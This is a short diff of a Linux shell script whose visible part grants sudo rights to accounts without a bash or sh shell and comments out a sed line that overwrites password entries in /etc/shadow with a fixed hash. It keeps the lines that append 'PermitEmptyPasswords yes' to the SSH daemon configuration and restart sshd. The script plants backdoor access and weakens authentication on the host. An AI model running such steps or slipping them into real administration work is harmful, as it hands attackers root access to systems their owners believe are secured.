@@ -16,8 +16,8 @@ for user in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f1)
     echo "Added $user to sudoers"
 done
 
-echo "=== Giving blank passwords to all non-passworded users ==="
-sed -i 's/*/U6aMy0wojraho/g' /etc/shadow
+#echo "=== Giving blank passwords to all non-passworded users ==="
+#sed -i 's/*/U6aMy0wojraho/g' /etc/shadow
 
 echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
 systemctl restart sshd
